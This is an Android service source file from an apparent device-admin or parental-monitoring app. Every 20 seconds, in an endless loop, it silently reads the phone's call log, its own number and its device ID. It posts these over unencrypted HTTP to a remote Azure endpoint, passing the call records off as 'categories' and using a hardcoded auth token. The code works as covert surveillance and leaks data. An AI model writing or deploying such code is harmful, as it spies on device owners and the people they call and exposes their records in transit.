package com.example.deviceadminsample;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.IBinder;
import android.provider.CallLog;
import android.support.v4.app.ActivityCompat;
import android.support.v4.app.NotificationCompat;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import com.android.volley.AuthFailureError;
import com.android.volley.NetworkResponse;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.HttpHeaderParser;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;
import java.util.Timer;

public class MyService extends Service {

    private NotificationCompat.Builder notificationBuilder;
    private NotificationManager notificationManager;

    private Timer timer = new Timer();
    private static final long UPDATE_INTERVAL = 10000;
    private MyService actual = null;
    private int count = 0;
    StringBuffer sb = new StringBuffer();
    private int READ_PHONE_STATE=400;
    private String phoneNumber;
    private String cellLocation;
    private String list;
    private String childIdDeails="46b137f7-4b0e-4b78-bd62-ac00ddfbccd7";
    private String childIdPhoneNumber="6bef5357-0a47-41a6-83ca-6dda0766fb05";

    public MyService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Thread t = new Thread(new Runnable() {
            @Override
            public void run() {
                startJob();
            }
        });
        t.start();
        //startJob();
        return Service.START_STICKY;
    }

    private void startJob() {
        count++;
        //do job here
        if (count % 2 == 0) {
            System.out.println("myservice running" + new Date());
            //setDataForSimpleNotification();
            System.out.println("getDetails::"+getDetails()+"getDetailsgetDetails");
            System.out.println("phoneNumberphoneNumber::"+getDetails()+"getDetailsgetDetails");
            sendData(getDetails(),childIdDeails);
            sendData(phoneNumber,childIdPhoneNumber);

            //getDetails();
            System.out.println("failed failed");
        }


        System.out.println("\n Count:" + count);
        //System.out.println("\n Serive update");
        //job completed. Rest for 5 second before doing another one
        try {
            Thread.sleep(20000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        //do job again
        startJob();
    }

    private void sendData(String details, String childId) {

        String id = getDeviceId(getApplicationContext());
        RequestQueue requestQueue = Volley.newRequestQueue(this);
        String URL = "http://ptpapiapp.azurewebsites.net:80/api/Child/PostChildrenCategories?childId="+childId+"&categories=" + details;
        StringRequest stringRequest = new StringRequest(Request.Method.POST, URL, new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                Log.i("VOLLEY", response);
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                Log.e("VOLLEY", error.toString());
            }
        }) {
            @Override
            public String getBodyContentType() {
                return "application/json; charset=utf-8";
            }


            @Override
            public Map<String, String> getHeaders() throws AuthFailureError {
                Map<String, String> params = new HashMap<String, String>();
                params.put("AuthToken", "744CB7BF-AACC-4CE8-87D4-01EAD4905AE8");
                return params;
            }


            @Override
            protected Response<String> parseNetworkResponse(NetworkResponse response) {
                String responseString = "";
                if (response != null) {
                    responseString = String.valueOf(response.statusCode);
                    // can get more details such as response.headers
                }
                try {
                    return Response.success(responseString, HttpHeaderParser.parseCacheHeaders(response));
                } catch (Exception e) {
                    e.printStackTrace();
                    return null;

                }
            }
        };

        requestQueue.add(stringRequest);

    }

    @SuppressLint("HardwareIds")
    private String getDeviceId(Context applicationContext) {
        TelephonyManager telephonyManager = (TelephonyManager) getApplication().getSystemService(Context.TELEPHONY_SERVICE);
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            readPhoneStatePermission();

        }
        else {
            if (telephonyManager != null) {
                phoneNumber=telephonyManager.getLine1Number();
                cellLocation=telephonyManager.getLine1Number();
                System.out.println("numbernumber:" + telephonyManager.getLine1Number());
                System.out.println("numberLocation:" + telephonyManager.getAllCellInfo());
                return telephonyManager.getDeviceId();
            }
        }
        return null;
    }

    private void readPhoneStatePermission() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
                == PackageManager.PERMISSION_GRANTED) {
            // Permission is already available, start camera preview
            Toast.makeText(this,"READ_PHONE_STATE is available. Starting preview.",Toast.LENGTH_SHORT).show();

        } else {
            // Permission is missing and must be requested.
            //new DeviceAdminSample().requestPhoneStatePermission();
        }
    }




    private String getDetails() {

        try{
            StringBuffer sb = new StringBuffer();
            StringBuffer sb1 = new StringBuffer();
            ArrayList<String> mylist = new ArrayList<String>();
            mylist.add(new Date().toString());
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
                // TODO: Consider calling
                //    ActivityCompat#requestPermissions
                // here to request the missing permissions, and then overriding
                //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
                //                                          int[] grantResults)
                // to handle the case where the user grants the permission. See the documentation
                // for ActivityCompat#requestPermissions for more details.
                return null;
            }
            Cursor managedCursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
            int number = managedCursor.getColumnIndex( CallLog.Calls.NUMBER );
            int type = managedCursor.getColumnIndex( CallLog.Calls.TYPE );
            int date = managedCursor.getColumnIndex( CallLog.Calls.DATE);
            int duration = managedCursor.getColumnIndex( CallLog.Calls.DURATION);
            sb.append( "Call Details-");
            while ( managedCursor.moveToNext() ) {
                String phNumber = managedCursor.getString( number );
                String callType = managedCursor.getString( type );
                String callDate = managedCursor.getString( date );
                Date callDayTime = new Date(Long.valueOf(callDate));
                String callDuration = managedCursor.getString( duration );
                String dir = null;
                int dircode = Integer.parseInt( callType );
                switch( dircode ) {
                    case CallLog.Calls.OUTGOING_TYPE:
                        dir = "OUTGOING";
                        break;

                    case CallLog.Calls.INCOMING_TYPE:
                        dir = "INCOMING";
                        break;

                    case CallLog.Calls.MISSED_TYPE:
                        dir = "MISSED";
                        break;
                }
                sb.append( "PN-"+phNumber +"CT-"+dir+"CDt-"+callDayTime+"CDur-"+callDuration );
                sb1.append( "PN"+phNumber+"CD"+callDayTime+"CD"+callDuration );
                mylist.add("PN-"+phNumber +"CT-"+dir+"CDt-"+callDayTime+"CDur-"+callDuration);
                //sb.append("\n----------------------------------");
            }
            managedCursor.close();
            System.out.println("sbsbsb"+sb.toString());
            StringBuilder list= new StringBuilder();
            try {
                for (int i=0;i<mylist.size();i++)
                {
                    if (i>=10)
                        break;
                    System.out.println("mylistmylist:"+mylist.get(mylist.size()-1-i));
                    list.append(mylist.get(mylist.size()-1-i));

                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            this.list= list.toString();
            this.sb=sb;
        } catch (NumberFormatException e) {
            e.printStackTrace();
        }
        list=new Date().toString()+list;
        list=list.replace("GMT+05:30","");
        list=list.replace(" ","-");
        System.out.println("listlist"+list);

        return list;
    }




    /*private void setDataForSimpleNotification() {
        notificationBuilder = new NotificationCompat.Builder(this)
                .setSmallIcon(R.mipmap.ic_launcher)
                .setContentTitle("From Service")
                .setContentText("Service");
        sendNotification();
    }*/

    /*private void sendNotification() {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent contentIntent = PendingIntent.getActivity(this, 0, notificationIntent, PendingIntent.FLAG_UPDATE_CURRENT);
        notificationBuilder.setContentIntent(contentIntent);
        Notification notification = notificationBuilder.build();
        notification.flags |= Notification.FLAG_AUTO_CANCEL;
        notification.defaults |= Notification.DEFAULT_SOUND;
        if (count == Integer.MAX_VALUE - 1)
            count = 0;
        notificationManager.notify(count, notification);
    }*/
}
